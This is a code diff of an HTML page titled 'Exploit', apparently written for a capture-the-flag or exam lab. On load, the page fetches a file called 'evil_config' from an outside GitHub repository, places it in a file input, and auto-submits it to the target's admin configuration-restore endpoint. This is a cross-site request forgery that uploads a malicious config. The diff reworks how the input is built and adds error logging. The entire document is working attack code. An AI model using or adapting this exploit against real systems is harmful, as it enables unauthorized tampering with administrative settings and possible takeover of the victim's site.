@@ -2,20 +2,23 @@
 <html>
   <head><meta charset="UTF-8"><title>Exploit</title></head>
   <body>
-    <form id="upload" method="POST" action="https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/admin/configs/restore" enctype="multipart/form-data">
-      <input type="file" name="config_file" id="fileInput" />
-    </form>
+    <form id="upload" method="POST" action="https://cybershortlink-dc105f08.exam.cyberjutsu-lab.tech/admin/configs/restore" enctype="multipart/form-data"></form>
     <script>
       fetch("https://raw.githubusercontent.com/Shu-Ouma-0/evil_config/main/config_backup.sav")
         .then(r => r.blob())
         .then(blob => {
-          const file = new File([blob], "config_backup.sav");
+          const input = document.createElement("input");
+          input.type = "file";
+          input.name = "config_file";
+
           const dt = new DataTransfer();
-          dt.items.add(file);
-          const input = document.getElementById("fileInput");
+          dt.items.add(new File([blob], "config_backup.sav"));
           input.files = dt.files;
+
+          document.getElementById("upload").appendChild(input);
           document.getElementById("upload").submit();
-        });
+        })
+        .catch(err => console.error("Exploit failed:", err));
     </script>
   </body>
 </html>
